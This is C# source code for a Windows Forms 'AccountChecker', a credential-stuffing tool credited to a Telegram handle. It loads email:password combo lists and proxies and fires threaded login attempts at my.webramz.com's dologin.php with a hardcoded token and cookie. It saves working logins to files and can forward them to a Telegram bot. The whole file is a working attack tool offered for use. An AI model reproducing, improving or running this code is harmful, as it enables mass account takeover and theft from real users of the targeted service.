using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace AccountChecker
{
    public partial class Main : Form
    {
        class AccountItem
        {
            public string Email { get; set; }
            public string Password { get; set; }

            //Checker Source By @liltoba0
            //LilToba
            //https://t.me/ghoulblack

            //https://t.me/liltoba0

            //https://t.me/liltoba
        }

        List<AccountItem> accounts = new List<AccountItem>();

        List<string> proxies = new List<string>();
        Stopwatch watch = new Stopwatch();
        bool started;
        int checkeds, errors, goods, currentProxy, badProxy;


        public Main()
        {
            InitializeComponent();
        }

        private void start_Click(object sender, EventArgs e)
        {
            if (accounts.Count == 0)
            {

                MessageBox.Show("Please load accounts and retry.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (proxies.Count == 0)
            {
         
                MessageBox.Show("Please load proxies and retry.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            int th = int.Parse(threads.Value.ToString());

            start.Enabled = false;
            load.Enabled = false;
            threads.Enabled = false;
            saveformat.Enabled = false;
            loadproxy.Enabled = false;

            lblbads.Text = "Bads: 0";
            lblcheckeds.Text = "Checkeds: 0";
            lblbadproxies.Text = "Bad proxies: 0";
            lblerrors.Text = "Errors: 0";
            lblextants.Text = "Extants: " + accounts.Count;
            lblgoods.Text = "Goods: 0";
            lblthreads.Text = "Active threads: " + th;
            lbltime.Text = "Elapsed time: 00:00:00";
            watch.Restart();
            timer1.Start();
            pb.Value = 0;
            checkeds = 0;
            errors = 0;
            goods = 0;
            currentProxy = 0;
            badProxy = 0;
            logs.Clear();
      

            started = true;

            ThreadPool.SetMinThreads(th, th);
            ThreadPool.SetMaxThreads(th, th);
         
            foreach (AccountItem currentAccount in accounts) 
                ThreadPool.QueueUserWorkItem(delegate { Config(currentAccount); });

        }

        private void stop_Click(object sender, EventArgs e)
        {
            if (started)
                stopThreading();
        }

        private void load_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog(); 
            ofd.Filter = "Text Files (.txt)|*.txt"; 
            if (ofd.ShowDialog() == DialogResult.OK) 
            {
                accounts.Clear(); 
                foreach (string s in File.ReadAllLines(ofd.FileName))
                    if (s.Contains(":")) 
                        accounts.Add(new AccountItem() { Email = s.Split(':')[0], Password = s.Split(':')[1] }); 
                lblaccounts.Text = "Accounts: " + accounts.Count;
                pb.Maximum = accounts.Count;
            }
        }

        private void result_Click(object sender, EventArgs e)
        {
            if (Directory.Exists("result"))
                Process.Start("explorer", Application.StartupPath + "\\result");
            else
                MessageBox.Show("No result!");
 
        }

        void stopThreading()
        {
            start.Enabled = true;
            load.Enabled = true;
            loadproxy.Enabled = true;
            threads.Enabled = true;
            saveformat.Enabled = true;
            started = false;
            timer1.Stop();
            watch.Stop();
          
        }

        private void loadproxy_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog(); 
            ofd.Filter = "Text Files (.txt)|*.txt"; 
            if (ofd.ShowDialog() == DialogResult.OK) 
            {
                proxies.Clear(); 
                proxies.AddRange(File.ReadAllLines(ofd.FileName));
                lblproxies.Text = "Proxies: " + proxies.Count;
            }
        }

        void Config(AccountItem account)
        {
            if (started)
            {
                //---------------------------------------------
                try
                {
                    if (currentProxy == proxies.Count)
                        currentProxy = 0;


     
                    string email = account.Email; 
                    string pass = account.Password; 
                    byte[] _params = new UTF8Encoding().GetBytes($"token=1c6470ea04d6cc6a78fecafe9617eb76827b868b&username={email}&password={pass}");
           

                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://my.webramz.com/dologin.php");
                    request.Method = "POST";
                    request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.Referer = "https://webramz.com/";
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
                    request.ContentLength = _params.Length;
                    //request.Proxy = new WebProxy(proxies[currentProxy].Split(':')[0], int.Parse(proxies[currentProxy].Split(':')[1]));
          

                    CookieContainer cc = new CookieContainer();
                    cc.Add(new Uri("https://my.webramz.com/dologin.php"), new Cookie("WHMCSAr0G8vlW7V8Z", "63d6395f693c366fe5f48f6591bb51d5"));
                    request.CookieContainer = cc;

                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(_params, 0, _params.Length);
                    requestStream.Close();

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse(); 
                    string responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    if (responseString.Contains("logout.php")) 
                    {
                        string cap = Regex.Match(responseString, "<div class=\"stat\">(.*?)</div>").Groups[1].Value;
                        goods++; 
                        string goodString = (saveformat.Text + "\r\n---------------------\r\n").Replace("<USER>", email).Replace("<PASS>", pass).Replace("<CAP>", cap);
                        logs.Text += goodString;
                        if (!Directory.Exists("result"))
                            Directory.CreateDirectory("result");
                        File.AppendAllText("result\\" + DateTime.Now.Year + "_" + DateTime.Now.Month + "_" + DateTime.Now.Day + ".txt", goodString);
                  

                        if (telegramservice.Checked)
                            new WebClient().DownloadString("https://api.telegram.org/bot" + bottoken.Text + "/sendMessage?chat_id=" + chatid.Text + "&text=" + goodString);
                     
                    }
                }
                catch (WebException) { badProxy++; }
                catch (Exception ex)
                {
                    File.AppendAllText("error_log.txt", ex.Message + "\r\n");
                    errors++;

                }
                //---------------------------------------------
                checkeds++;
                currentProxy++; 

                lblcheckeds.Text = "Checkeds: " + checkeds;
                lblbads.Text = "Bads: " + (checkeds - (goods + badProxy + errors));
                lblbadproxies.Text = "Bad proxies: " + badProxy;
                lblerrors.Text = "Errors: " + errors;
                lblextants.Text = "Extants: " + (accounts.Count - checkeds);
                lblgoods.Text = "Goods: " + goods;
                pb.Value = checkeds;


                if (checkeds == accounts.Count)
                    stopThreading();
            
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            lbltime.Text = string.Format("Elapsed time: {0:00}:{1:00}:{2:00}", watch.Elapsed.Hours, watch.Elapsed.Minutes, watch.Elapsed.Seconds);

        }
    }
}
